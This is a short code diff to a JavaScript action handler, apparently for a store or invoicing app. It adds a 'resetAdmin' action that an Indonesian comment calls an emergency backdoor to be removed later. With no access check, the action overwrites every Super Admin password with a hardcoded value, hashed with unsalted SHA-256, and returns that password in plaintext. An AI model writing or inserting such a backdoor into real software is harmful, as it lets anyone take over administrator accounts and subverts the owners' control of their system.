@@ -180,7 +180,14 @@ async function handleAction(action, payload) {
     analyzeInvoiceImage: () => analyzeInvoiceImage(payload),
     backupData: () => backupData(),
     restoreData: () => restoreData(payload.backup),
-    modules: () => availableModules()
+    modules: () => availableModules(),
+    resetAdmin: async () => {
+      // Pintu Belakang Darurat (Akan dihapus nanti)
+      const defaultPassword = "garnetamart123";
+      const hashed = crypto.createHash("sha256").update(defaultPassword).digest("hex");
+      await db.query("UPDATE users SET password_hash = ? WHERE role = 'Super Admin'", [hashed]);
+      return { message: `Password Super Admin berhasil di-reset menjadi: ${defaultPassword}` };
+    }
   };
 
   if (coreActions[action]) return coreActions[action]();
